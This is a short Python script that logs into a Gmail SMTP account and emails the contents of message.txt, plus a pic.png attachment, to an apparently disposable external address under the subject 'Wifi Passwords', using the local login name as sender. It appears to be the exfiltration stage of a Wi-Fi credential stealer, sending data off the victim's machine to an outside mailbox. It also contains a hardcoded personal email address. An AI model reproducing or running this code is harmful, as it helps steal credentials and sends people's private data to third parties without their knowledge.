import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from os import getlogin

name = getlogin()
email = "stephendappah1@gmail.com"
server = smtplib.SMTP("smtp.gmail.com", 587)
server.ehlo()
server.starttls()
with open("password.txt", "r") as f:
    password = f.read()

server.login(email, password)

msg = MIMEMultipart()
msg["From"] = name
msg["To"] = "orrzkua234@oxiburn.com"
msg["Subject"] = "Wifi Passwords"

with open("message.txt", "r") as f:
    message = f.read()

msg.attach(MIMEText(message, "plain"))

filename = "pic.png"
attachment = open(filename, "rb")

p = MIMEBase("application", "octet-stream")
p.set_payload(attachment.read())
encoders.encode_base64(p)
p.add_header("Content-Disposition", f"attachment; filename={filename}")
msg.attach(p)
text = msg.as_string()
server.sendmail("stephendappah1@gmail.com", "orrzkua234@oxiburn.com", text)